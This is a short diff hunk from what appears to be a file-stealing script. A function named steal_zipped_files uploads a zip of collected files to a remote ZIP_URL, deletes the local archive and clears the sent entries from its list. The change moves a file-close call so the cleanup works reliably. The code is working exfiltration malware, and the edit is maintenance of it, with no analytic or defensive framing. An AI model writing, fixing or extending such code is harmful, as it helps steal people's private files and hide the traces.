@@ -36,10 +36,10 @@ def steal_zipped_files():
     with open(zip_name, 'rb') as zip: # open the zip file in bytes so it can be sent properly
         zip_file = {'file':(zip_name, zip, 'application/zip')} # make the payload
         r = requests.post(ZIP_URL, files=zip_file) # send the zip file
+        zip.close()
         if not 300 > r.status_code >= 200:
             pass
         else:
-            zip.close() # close the zip file so it can be deleted properly
             os.remove(zip_name) # delete the zip file so you don't have a bunch sitting around
             del files_found[:count] # remove any files already sent from the list of files to be sent
 
